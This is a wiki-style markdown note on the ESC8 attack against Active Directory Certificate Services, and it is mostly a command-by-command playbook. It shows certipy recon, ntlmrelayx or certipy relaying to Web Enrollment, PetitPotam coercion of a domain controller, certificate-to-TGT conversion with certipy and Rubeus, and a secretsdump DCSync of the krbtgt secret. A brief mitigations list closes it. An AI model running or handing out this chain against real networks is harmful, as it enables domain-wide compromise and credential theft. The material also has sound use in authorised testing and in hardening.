---
title: ESC8 — NTLM Relay to AD CS (PetitPotam → DCSync)
type: source
created: 2026-06-13
updated: 2026-06-13
tags: [active-directory, ad-cs, ntlm, relay, dcsync]
source: raw/ntlm_relay_ad_cs.md
---

# ESC8 — NTLM Relay to AD CS (PetitPotam → DCSync)

> Source: `raw/ntlm_relay_ad_cs.md` (SpecterOps / Certipy / The Hacker
> Recipes)

## Summary

End-to-end ESC8 chain: coerce a Domain Controller into authenticating to an
attacker-controlled relay, relay that NTLM auth to AD CS Web Enrollment to
obtain a machine certificate for the DC, then use the certificate to dump
`krbtgt` via DCSync.

## Chain

1. **Recon** — find the CA and check for vulnerable templates/endpoints:
   ```bash
   certipy find -u 'user' -p 'password' -dc-ip <DC_IP> -vulnerable -stdout
   ```
2. **Relay listener** — point at AD CS Web Enrollment:
   ```bash
   impacket-ntlmrelayx -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template DomainController
   # or
   certipy relay -target "http://<CA_IP>/certsrv/certfnsh.asp" -template DomainController
   ```
3. **Coercion (PetitPotam)** — force the DC to authenticate to the relay:
   ```bash
   python3 PetitPotam.py <Attacker_IP> <DC_IP>
   ```
   Relay listener captures a base64-encoded PFX cert for the DC's machine
   account.
4. **Impersonation** — turn the cert into a TGT/NT hash:
   ```bash
   certipy auth -pfx <cert_file>.pfx -dc-ip <DC_IP> -username <DC_NAME>$ -domain <DOMAIN>
   # or on Windows:
   Rubeus.exe asktgt /user:<DC_NAME>$ /certificate:<BASE64_PFX> /ptt
   Rubeus.exe asktgt /user:<DC_NAME>$ /certificate:<BASE64_PFX> /getcredentials   # UnPAC the hash
   ```
5. **DCSync**:
   ```bash
   impacket-secretsdump -hashes :<DC_NT_HASH> '<DOMAIN>/<DC_NAME>$@<DC_IP>'
   ```

## Requirements

- Target DC has Print Spooler or EFSRPC enabled (default in many envs).
- AD CS has Web Enrollment/CES over HTTP (no EPA).
- `DomainController` or `Machine` template available for enrollment.

## Mitigations

- Enable EPA + require HTTPS on AD CS web interfaces.
- Disable NTLM on AD CS (force Kerberos).
- RPC filters on DCs to block MS-EFSRPC/MS-RPRN.
- Uninstall Web Enrollment if not required.

## Links

- [[ad-cs-esc-attacks]] — ESC8 in the broader ESC1-15 taxonomy
- [[ntlm-relay-coercion]] — PetitPotam coercion + relay mechanics generally
- [[dcsync]] — final-stage exploitation
- [[kerberos-delegation-abuse]] — unconstrained-delegation coercion shares
  the same "coerce the DC" first step
</content>
